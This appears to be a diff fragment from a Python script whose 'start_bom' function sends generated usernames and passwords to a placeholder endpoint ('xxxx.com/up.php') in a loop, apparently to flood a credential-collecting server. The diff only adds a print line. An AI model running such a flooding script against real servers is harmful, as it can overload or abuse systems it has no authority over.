@@ -23,6 +23,7 @@ def start_bom():
         userpass = str(pass1 + pass2 + pass3)
         url = "http://xxxx.com/up.php?" + "user=" + user1 + "&pass=" + userpass
         request1 = urllib.request.urlopen(url, timeout=2)
+        print(times)
         print("USER=" + user1)
         print("PASS=" + userpass)
         print(str(request1.read(), 'utf8'))
